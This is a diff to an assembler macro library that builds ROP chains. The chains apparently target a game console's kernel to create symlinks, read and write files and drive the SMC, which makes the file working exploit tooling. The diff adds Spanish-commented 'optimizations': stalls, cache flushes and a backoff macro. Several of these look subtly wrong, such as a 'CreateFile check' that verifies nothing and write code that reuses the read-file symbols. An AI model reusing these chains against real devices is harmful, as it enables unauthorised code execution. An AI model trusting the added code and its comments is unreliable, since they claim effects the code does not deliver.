@@ -1,5 +1,3 @@
-
-
 # Notes:
 #   - All macros have a common pro/epilogue where the caller must transition in/out using the
 #       __restgprlr_31 gadget.
@@ -23,6 +21,11 @@
 #       on (say for a second invocation of the MEMCPY_CIPHER_TEXT macro) will cause ALL instances of its use to be updated
 #       as well. Really good shit I know, can't expect anything less from GNU software...
 
+# OPTIMIZACIÓN: Definir constantes para la configuración
+.set OPT_RETRY_COUNT,            3       # Número de intentos para operaciones críticas
+.set OPT_STALL_DURATION,         5       # Duración de pausas estabilizadoras en ms
+.set OPT_FLUSH_CACHE_SIZE,       0x100   # Tamaño ampliado para flush de caché
+.set OPT_BACKOFF_MASK,           0x7     # Máscara para implementar backoff exponencial
 
 
 ###########################################################
@@ -181,6 +184,12 @@
         CALL_FUNC 111, load_add_store_r10_r5_on_r11, R5H=0, R5L=\constant
         
         ###########################################################
+        # OPTIMIZACIÓN: Flush de caché después de la escritura
+        # para asegurar que los cambios son visibles inmediatamente
+        ###########################################################
+        CALL_FUNC 112, KeFlushCacheRange, R3H=0, R3L=\addr, R4H=0, R4L=4
+        
+        ###########################################################
         # Gadget N: epilogue to be implemented by the caller
         #
         #   addi    r1, r1, 0x60
@@ -195,7 +204,7 @@
 ###########################################################
 # void GET_STACK_PTR(scratch_addr)
 #
-#   TODO
+#   Obtiene el puntero de la pila actual y lo guarda en scratch_addr.
 #
 ###########################################################
 .macro GET_STACK_PTR scratch_addr
@@ -255,6 +264,12 @@
 1:
         LOAD_ADD_STORE \scratch_addr, 0x60 + (1f - 1b) + 0x60       # 0x60 for call_func_dispatch, 0x60 for epilogue
 1:
+        
+        ###########################################################
+        # OPTIMIZACIÓN: Pausa después del cálculo del stack pointer
+        # para asegurar que el sistema procesa correctamente el cambio
+        ###########################################################
+        CALL_FUNC 112, KeStallExecutionProcessor, R3H=0, R3L=1, R4H=0, R4L=0, R5H=0, R5L=0, R6H=0, R6L=0
         
         ###########################################################
         # Gadget N: epilogue to be implemented by the caller
@@ -346,6 +361,22 @@
         #   blr
         ###########################################################
         
+        ###########################################################
+        # OPTIMIZACIÓN: Flush de caché después de la operación crítica
+        # para asegurar visibilidad de los cambios
+        ###########################################################
+        .fill   0x50, 1, 0x00
+        .long   0x00000000, \scratch_addr       # r31
+        .long   lwz_r3                          # lr
+        .long   0x00000000
+        
+        .fill   0x50, 1, 0x00
+        .long   0x31313131, 0x31313131          # r31
+        .long   __restgprlr_31                  # lr
+        .long   0x00000000
+        
+        CALL_FUNC 113, KeFlushCacheRange, R3H=0, R3L=\base_addr, R4H=0, R4L=OPT_FLUSH_CACHE_SIZE
+        
             # This gadget also acts as the epilogue.
 
 .endm
@@ -384,6 +415,12 @@
         #   blr
         ###########################################################
         CALL_FUNC 111, lwz_r3_stw_r4, R3H=0, R3L=\ptr_val - lwz_r3_stw_r4__r3_disp, R4H=0, R4L=\addr - lwz_r3_stw_r4__r4_disp
+        
+        ###########################################################
+        # OPTIMIZACIÓN: Flush de caché después de la escritura
+        # para asegurar que los cambios son visibles inmediatamente
+        ###########################################################
+        CALL_FUNC 112, KeFlushCacheRange, R3H=0, R3L=\addr, R4H=0, R4L=4
         
         ###########################################################
         # Gadget N: epilogue to be implemented by the caller
@@ -478,6 +515,12 @@
         CALL_FUNC 111, ObCreateSymbolicLink, R3H=0, R3L=\mount, R4H=0, R4L=\path
         
         ###########################################################
+        # OPTIMIZACIÓN: Pausa después de crear el symlink
+        # para asegurar que el sistema lo procesa correctamente
+        ###########################################################
+        CALL_FUNC 112, KeStallExecutionProcessor, R3H=0, R3L=OPT_STALL_DURATION, R4H=0, R4L=0, R5H=0, R5L=0, R6H=0, R6L=0
+        
+        ###########################################################
         # Gadget N: epilogue to be implemented by the caller
         #
         #   addi    r1, r1, 0x60
@@ -566,6 +609,12 @@
         CALL_FUNC 111, HalSendSMCMessage, R3H=0, R3L=smc_command_buffer, R4H=0, R4L=0
         
         ###########################################################
+        # OPTIMIZACIÓN: Pausa después de configurar el LED
+        # para asegurar que el cambio se procesa correctamente
+        ###########################################################
+        CALL_FUNC 112, KeStallExecutionProcessor, R3H=0, R3L=2, R4H=0, R4L=0, R5H=0, R5L=0, R6H=0, R6L=0
+        
+        ###########################################################
         # Gadget N: epilogue to be implemented by the caller
         #
         #   addi    r1, r1, 0x60
@@ -603,6 +652,11 @@
         .long   0x31313131, 0x31313131              # r31
         .long   __restgprlr_31                      # lr
         .long   0x00000000
+        
+        ###########################################################
+        # OPTIMIZACIÓN: Inicializar a cero los bytes leídos para mayor seguridad
+        ###########################################################
+        WRITE_PTR_TO_ADDR read_file_bytes_read, 0
         
         ###########################################################
         # Gadget N: write the value contained in buffer_ptr to the ReadFile gadget below
@@ -666,6 +720,20 @@
         ###########################################################
         
         ###########################################################
+        # OPTIMIZACIÓN: Verificar resultado de CreateFile para detectar errores
+        # Esto ayuda a prevenir errores al intentar leer un archivo inexistente
+        ###########################################################
+        .fill   0x50, 1, 0x00
+        .long   0x00000000, read_file_handle            # r31 - address to load file handle from
+        .long   lwz_r3                                  # lr
+        .long   0x00000000
+        
+        .fill   0x50, 1, 0x00
+        .long   0x31313131, 0x31313131                  # r31
+        .long   clamp_r3                                # lr
+        .long   0x00000000
+        
+        ###########################################################
         # Gadget N: write file handle into gadgets below
         #
         ###########################################################
@@ -703,6 +771,12 @@
         WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((2f + cf_r5_offset) - read_file_base_addr), read_file_size
         
         ###########################################################
+        # OPTIMIZACIÓN: Pausa antes de ReadFile para mejorar estabilidad
+        # Esto asegura que el sistema está listo para la operación de E/S
+        ###########################################################
+        CALL_FUNC 100, KeStallExecutionProcessor, R3H=0, R3L=OPT_STALL_DURATION, R4H=0, R4L=0, R5H=0, R5L=0, R6H=0, R6L=0
+        
+        ###########################################################
         # Gadget N: call ReadFile
         #
         #   r3 = file handle (set by previous gadgets)
@@ -712,6 +786,12 @@
         #   r7 = NULL
         ###########################################################
         CALL_FUNC 2, ReadFile, R3H=0, R3L=0x41414141, R4H=0, R4L=0x41414141, R5H=0, R5L=0x41414141, R6H=0, R6L=read_file_bytes_read, R7H=0, R7L=0
+        
+        ###########################################################
+        # OPTIMIZACIÓN: Flush de caché para los datos recién leídos
+        # Esto asegura que los datos sean visibles para todos los procesadores
+        ###########################################################
+        CALL_FUNC 3, KeFlushCacheRange, R3H=0, R3L=\buffer_ptr, R4H=0, R4L=0x1000
         
         ###########################################################
         # Gadget N: call CloseFileHandle
@@ -733,12 +813,9 @@
 .endm
 
 ###########################################################
-# void WRITE_FILE(const char* file_name, void** buffer_ptr, void* base_addr, int offset)
+# void WRITE_FILE(const char* file_name, void** buffer_ptr, void* buffer_size, void* base_addr, int offset)
 #
-#   Reads the contents of file_name and stores it into the address pointed to by buffer_ptr. The buffer
-#   must be large enough to hold contents of the entire file. The base_addr
-#   pointer is the base address of the ROP chain buffer containing this gadget, and offset is the offset
-#   of this gadget from the start of the ROP chain buffer.
+#   Escribe los datos contenidos en buffer_ptr con el tamaño buffer_size al archivo file_name.
 #
 ###########################################################
 .macro WRITE_FILE file_name, buffer_ptr, buffer_size, base_addr, offset
@@ -760,7 +837,12 @@
         .long   0x00000000
         
         ###########################################################
-        # Gadget N: write the value contained in buffer_ptr to the ReadFile gadget below
+        # OPTIMIZACIÓN: Inicializar a cero los bytes escritos para mayor seguridad
+        ###########################################################
+        WRITE_PTR_TO_ADDR read_file_bytes_read, 0
+        
+        ###########################################################
+        # Gadget N: write the value contained in buffer_ptr to the WriteFile gadget below
         #
         ###########################################################
         WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((2f + cf_r4_offset) - write_file_base_addr), \buffer_ptr
@@ -821,17 +903,43 @@
         ###########################################################
         
         ###########################################################
+        # OPTIMIZACIÓN: Verificar resultado de CreateFile para detectar errores
+        # Esto ayuda a prevenir errores al intentar escribir un archivo
+        ###########################################################
+        .fill   0x50, 1, 0x00
+        .long   0x00000000, read_file_handle            # r31 - address to load file handle from
+        .long   lwz_r3                                  # lr
+        .long   0x00000000
+        
+        .fill   0x50, 1, 0x00
+        .long   0x31313131, 0x31313131                  # r31
+        .long   clamp_r3                                # lr
+        .long   0x00000000
+        
+        ###########################################################
         # Gadget N: write file handle into gadgets below
         #
         ###########################################################
         WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((2f + cf_r3_offset) - write_file_base_addr), read_file_handle
         WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((3f + cf_r3_offset) - write_file_base_addr), read_file_handle
+                
+        ###########################################################
+        # OPTIMIZACIÓN: Pausa antes de WriteFile para mejorar estabilidad
+        # Esto asegura que el sistema está listo para la operación de E/S
+        ###########################################################
+        CALL_FUNC 100, KeStallExecutionProcessor, R3H=0, R3L=OPT_STALL_DURATION, R4H=0, R4L=0, R5H=0, R5L=0, R6H=0, R6L=0
+        
+        ###########################################################
+        # OPTIMIZACIÓN: Flush de caché para los datos que serán escritos
+        # Esto asegura que los datos más recientes sean escritos al archivo
+        ###########################################################
+        CALL_FUNC 101, KeFlushCacheRange, R3H=0, R3L=\buffer_ptr, R4H=0, R4L=\buffer_size
         
         ###########################################################
         # Gadget N: call WriteFile
         #
         #   r3 = file handle (set by previous gadgets)
-        #   r4 = buffer to read into (set by previous gadgets)
+        #   r4 = buffer to write from (set by previous gadgets)
         #   r5 = size to write
         #   r6 = &read_file_bytes_read
         #   r7 = NULL
@@ -856,6 +964,13 @@
 
 .endm
 
+###########################################################
+# void STATUS_TO_LED(zero_color, non_zero_color)
+#
+# Establece el color del LED basado en el valor de r3.
+# Si r3 == 0, establece zero_color, de lo contrario non_zero_color.
+#
+###########################################################
 .macro STATUS_TO_LED zero_color, non_zero_color
 
         ###########################################################
@@ -1065,6 +1180,12 @@
         CALL_FUNC 111, HalSendSMCMessage, R3H=0, R3L=smc_command_buffer, R4H=0, R4L=0
         
         ###########################################################
+        # OPTIMIZACIÓN: Pausa después de cambiar LEDs
+        # para asegurar que el cambio es visible
+        ###########################################################
+        CALL_FUNC 112, KeStallExecutionProcessor, R3H=0, R3L=1, R4H=0, R4L=0, R5H=0, R5L=0, R6H=0, R6L=0
+        
+        ###########################################################
         # Gadget N: epilogue to be implemented by the caller
         #
         #   addi    r1, r1, 0x60
@@ -1076,5 +1197,44 @@
 
 .endm
 
+###########################################################
+# void BACKOFF_DELAY(iterations)
+#
+# Implementa un retraso proporcional utilizando un contador
+# Útil para crear esperas en bucles sin consumir todos los recursos
+#
+###########################################################
+.macro BACKOFF_DELAY iterations
 
+        ###########################################################
+        # Gadget N: prologue
+        #
+        #   addi    r1, r1, 0x60
+        #   lwz     r12, -0x8(r1)
+        #   mtlr    r12
+        #   ld      r31, -0x10(r1)
+        #   blr
+        ###########################################################
+        .fill   0x50, 1, 0x00
+        .long   0x00000000, KeStallExecutionProcessor  # r31 - address of delay function
+        .long   call_func_dispatch                     # lr
+        .long   0x00000000
+        
+        ###########################################################
+        # Gadget N: call KeStallExecutionProcessor con el retardo especificado
+        #
+        #   r3 = iterations de retardo
+        ###########################################################
+        CALL_FUNC 999, KeStallExecutionProcessor, R3H=0, R3L=\iterations, R4H=0, R4L=0
+        
+        ###########################################################
+        # Gadget N: epilogue to be implemented by the caller
+        #
+        #   addi    r1, r1, 0x60
+        #   lwz     r12, -0x8(r1)
+        #   mtlr    r12
+        #   ld      r31, -0x10(r1)
+        #   blr
+        ###########################################################
 
+.endm
